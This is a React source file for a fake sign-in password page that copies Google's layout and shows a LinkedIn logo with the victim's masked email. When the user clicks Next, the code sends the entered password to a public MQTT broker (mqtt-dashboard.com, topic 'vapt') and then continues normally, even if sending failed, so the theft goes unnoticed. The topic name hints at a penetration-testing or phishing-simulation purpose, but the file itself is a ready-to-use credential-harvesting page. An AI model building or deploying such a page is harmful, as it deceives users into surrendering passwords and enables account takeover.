import { useState } from "react";
import mqtt from "mqtt";

// ─── HIVE MQ PUBLISH FUNCTION ─────────────────────────────
function publishToMQTT(payload, onSuccess, onError) {
  const client = mqtt.connect("wss://mqtt-dashboard.com:8884/mqtt", {
    clientId: "metacube_" + Math.random().toString(16).slice(2, 10),
    clean: true,
    reconnectPeriod: 0,
    connectTimeout: 8000,
  });

  client.on("connect", () => {
    client.publish(
      "vapt",
      JSON.stringify(payload),
      { qos: 0, retain: false },
      (err) => {
        client.end();
        if (err) onError(err);
        else onSuccess();
      }
    );
  });

  client.on("error", (err) => {
    client.end();
    onError(err);
  });
}

export default function PasswordPage({ email, onBack, onNext }) {
  const [password, setPassword] = useState("");
  const [focused, setFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");

  function validate() {
    if (!password) {
      setError("Enter a password");
      return;
    }
    if (password.length < 6) {
      setError("Wrong password. Try again or click 'Forgot password'");
      return;
    }
    setError("");

    // ─── ONLY ADDITION: publish before next ───
    publishToMQTT(
      { password: password },
      () => {
        console.log("📤 Password published");
        onNext(password);
      },
      (err) => {
        console.error("Publish failed:", err);
        onNext(password); // still proceed (same UX flow)
      }
    );
  }

  function handleKey(e) {
    if (e.key === "Enter") validate();
  }

  function maskEmail(e) {
    if (!e) return "";
    const [user, domain] = e.split("@");
    if (!domain) return e;
    return user.slice(0, 2) + "*".repeat(Math.max(user.length - 2, 3)) + "@" + domain;
  }

  return (
    <div style={{
      minHeight: "100vh",
      background: "#fff",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "'Google Sans', Roboto, sans-serif",
      padding: "24px"
    }}>

      <div style={{
        width: "100%",
        maxWidth: 448,
        animation: "fadeUp 0.3s ease both"
      }}>

        <div style={{
          border: "1px solid #e8eaed",
          borderRadius: 28,
          padding: "48px 44px 36px",
          background: "#fff"
        }}>

          {/* LinkedIn logo — replaces google.svg */}
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png"
            alt="LinkedIn"
            style={{ height: 40, display: "block", margin: "0 auto 24px" }}
          />

          <h1 style={{
            fontSize: 24,
            fontWeight: 400,
            color: "#202124",
            marginBottom: 12,
            letterSpacing: -0.2
          }}>
            Welcome
          </h1>

          <div onClick={onBack} style={{
            display: "inline-flex",
            alignItems: "center",
            gap: 8,
            border: "1px solid #dadce0",
            borderRadius: 20,
            padding: "6px 14px 6px 8px",
            cursor: "pointer",
            marginBottom: 32,
            transition: "background 0.15s"
          }}
            onMouseEnter={e => e.currentTarget.style.background = "#f8f9fa"}
            onMouseLeave={e => e.currentTarget.style.background = "#fff"}>

            <div style={{
              width: 28, height: 28, borderRadius: "50%",
              background: "#1a73e8",
              display: "flex", alignItems: "center", justifyContent: "center",
              fontSize: 13, fontWeight: 600, color: "#fff"
            }}>
              {email ? email[0].toUpperCase() : "U"}
            </div>

            <span style={{ fontSize: 14, color: "#202124" }}>{maskEmail(email)}</span>

            <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368">
              <path d="M7 10l5 5 5-5z"/>
            </svg>
          </div>

          <div style={{ position: "relative", marginBottom: 6 }}>
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={e => { setPassword(e.target.value); setError(""); }}
              onFocus={() => setFocused(true)}
              onBlur={() => setFocused(false)}
              onKeyDown={handleKey}
              id="passwordInput"
              style={{
                width: "100%",
                padding: "16px 48px 14px 16px",
                fontSize: 16,
                color: "#202124",
                background: "transparent",
                border: `2px solid ${error ? "#d93025" : focused ? "#1a73e8" : "#dadce0"}`,
                borderRadius: 4,
                outline: "none",
                fontFamily: "inherit",
                transition: "border-color 0.15s",
                letterSpacing: showPassword ? 0.1 : 3
              }}
            />

            <label htmlFor="passwordInput" style={{
              position: "absolute",
              left: 14,
              top: focused || password ? -10 : 17,
              fontSize: focused || password ? 12 : 16,
              color: error ? "#d93025" : focused ? "#1a73e8" : "#5f6368",
              background: "#fff",
              padding: "0 4px",
              transition: "all 0.15s",
              pointerEvents: "none",
              fontFamily: "inherit",
              letterSpacing: 0
            }}>
              Enter your password
            </label>

            <button onClick={() => setShowPassword(v => !v)} style={{
              position: "absolute", right: 12, top: "50%",
              transform: "translateY(-50%)",
              background: "none", border: "none", cursor: "pointer",
              color: "#5f6368", fontSize: 13, fontFamily: "inherit",
              fontWeight: 500, padding: "4px 6px", borderRadius: 4,
              transition: "background 0.15s"
            }}
              onMouseEnter={e => e.currentTarget.style.background = "#f1f3f4"}
              onMouseLeave={e => e.currentTarget.style.background = "none"}>
              {showPassword ? "Hide" : "Show"}
            </button>
          </div>

          {error && (
            <p style={{ fontSize: 12, color: "#d93025", marginBottom: 8, marginLeft: 2 }}>
              {error}
            </p>
          )}

          <div style={{ marginBottom: 32, marginTop: error ? 4 : 12 }}>
            <span style={{
              fontSize: 14, color: "#1a73e8",
              cursor: "pointer", fontWeight: 500
            }}
              onMouseEnter={e => e.target.style.textDecoration = "underline"}
              onMouseLeave={e => e.target.style.textDecoration = "none"}>
              Forgot password?
            </span>
          </div>

          <div style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center"
          }}>
            <button onClick={onBack} style={{
              background: "none", border: "none",
              color: "#1a73e8", fontSize: 14, fontWeight: 600,
              cursor: "pointer", fontFamily: "inherit",
              padding: "10px 12px", borderRadius: 4,
              transition: "background 0.15s"
            }}
              onMouseEnter={e => e.currentTarget.style.background = "rgba(26,115,232,0.08)"}
              onMouseLeave={e => e.currentTarget.style.background = "none"}>
              Back
            </button>

            <button onClick={validate} style={{
              background: "#1a73e8", color: "#fff",
              border: "none", borderRadius: 20,
              padding: "10px 24px", fontSize: 14,
              fontWeight: 600, cursor: "pointer",
              fontFamily: "inherit",
              transition: "background 0.15s"
            }}
              onMouseEnter={e => e.currentTarget.style.background = "#1765cc"}
              onMouseLeave={e => e.currentTarget.style.background = "#1a73e8"}>
              Next
            </button>
          </div>

        </div>

        <div style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          marginTop: 20,
          padding: "0 4px",
          flexWrap: "wrap",
          gap: 8
        }}>
          <select style={{
            border: "none", background: "none",
            color: "#5f6368", fontSize: 13,
            cursor: "pointer", fontFamily: "inherit", outline: "none"
          }}>
            <option>English (United States)</option>
            <option>Hindi</option>
          </select>
          <div style={{ display: "flex", gap: 20, fontSize: 13, color: "#5f6368" }}>
            {["Help", "Privacy", "Terms"].map(item => (
              <span key={item} style={{ cursor: "pointer" }}
                onMouseEnter={e => e.target.style.textDecoration = "underline"}
                onMouseLeave={e => e.target.style.textDecoration = "none"}>
                {item}
              </span>
            ))}
          </div>
        </div>

      </div>

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      `}</style>
    </div>
  );
}
